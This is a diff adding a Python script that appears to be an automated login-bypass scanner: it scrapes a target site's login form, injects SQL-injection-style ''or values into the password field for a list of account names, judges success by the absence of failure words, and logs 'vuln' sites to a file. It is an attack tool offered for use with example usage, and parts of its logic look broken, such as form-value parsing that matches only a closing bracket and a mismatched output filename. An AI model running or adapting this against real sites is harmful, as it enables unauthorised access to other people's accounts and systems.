@@ -1,0 +1,118 @@
+import requests
+import re
+
+def clean_url(target):
+    """Ensure the URL is properly formatted and return the clean URL."""
+    site = target.replace("http://", "").replace("https://", "")
+    return site
+
+def get_post_url(ng, site):
+    """Extract and return the post URL from the page source."""
+    posturl_matches = re.findall(r"post\('[^']*'|POST\('[^']*'|action=\"[^\"]*\"", ng)
+    posturl = ""
+    
+    if posturl_matches:
+        posturl = sorted(set([re.sub(r"action=\"|post\('|'\"", '', u) for u in posturl_matches]))[0]
+    else:
+        print(f"[INFO] No post URL found for {site}")
+    
+    return posturl
+
+def get_base_url(site, ng):
+    """Extract the base URL for making the POST request."""
+    if re.search(r"\.", site.split("/")[-1]):
+        tmp = site.split("/")[-1]
+        return site.replace(tmp, "")
+    else:
+        return "/".join(site.split("/")[:2])
+
+def extract_form_data(ng):
+    """Extract form data like input fields and their values."""
+    value_matches = re.findall(r'(<input).*?(>)', ng)
+    values = []
+    
+    for match in value_matches:
+        name_value = re.findall(r'name="([^"]*)" value="([^"]*)"', match[1])
+        if name_value:
+            values.extend(name_value)
+    
+    return "&".join([f"{name}={val}" for name, val in values])
+
+def prepare_post_data(xploit, param1, param2, value):
+    """Prepare the post data based on the exploit and parameters."""
+    if "@gmail" in xploit:
+        return f"{param1}={xploit}&{param2}=''or{value}"
+    else:
+        return f"{param1}={xploit}&{param2}={xploit}{value}"
+
+def attempt_login(post, postdata):
+    """Perform the POST request and return the response."""
+    try:
+        response = requests.post(post, data=postdata)
+        return response.text
+    except requests.exceptions.RequestException as e:
+        print(f"Error during POST request: {e}")
+        return ""
+
+def bypass(target, exploits):
+    session = requests.Session()  # Use a session for persistent connection
+    sukses = ""
+    value = ""
+    postnya = ""
+    post = ""
+    posturl = ""
+
+    print(f"\n[*] Starting {target}")
+
+    for xploit in exploits:
+        print(f"Trying login with: {xploit}")
+
+        site = clean_url(target)
+        
+        try:
+            ng = session.get(f"http://{site}").text
+        except requests.exceptions.RequestException as e:
+            print(f"Error connecting to {target}: {e}")
+            continue
+
+        # Get the post URL from the page content
+        posturl = get_post_url(ng, site)
+        
+        postnya = get_base_url(site, ng)
+        
+        # Extract the final post URL
+        post = f"{postnya}{posturl}" if "action=\"http" not in ng else re.search(r'action="([^"]*)"', ng).group(1)
+
+        # Extract form values
+        value = extract_form_data(ng)
+
+        # Extract form parameters
+        param = ",".join(sorted(set(re.findall(r'name="([^"]*)"', ng)[:2])))
+        param1, param2 = param.split(",") if len(param.split(",")) > 1 else (param, '')
+
+        # Prepare post data
+        postdata = prepare_post_data(xploit, param1, param2, value)
+
+        # Attempt login
+        cek = attempt_login(post, postdata)
+
+        # Check for login failure
+        if re.search(r"(User|user|password|Password|Username|username|email|Email|salah|Salah|Gagal|coba|gagal|wrong|Wrong|Invalid|IncorectError|405|error)", cek):
+            print(f"Login failed with: {xploit}")
+            print(f"Post data: {post} -d {postdata}\n")
+        else:
+            if xploit == "test" or not xploit:
+                print("Failed to obtain a valid login\n")
+                break
+            sukses = f"\n+++++++++++++++++++++!!![ login success ]!!!+++++++++++++++++++++\nSite: {target} \nLogin: {xploit}"
+            print(f"{sukses}\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
+            with open("vuln.txt", "a") as f:
+                f.write(f"{sukses}\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n")
+            print(f"\a[INFO] Login success\nSite: {target}\nLogin: {xploit}\nSaved: vuln-bypass.txt\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n")
+
+
+# Example usage:
+if __name__ == "__main__":
+    target = "http://example.com"
+    exploits = ["user1@gmail.com", "user2@gmail.com", "test"]
+    bypass(target, exploits)
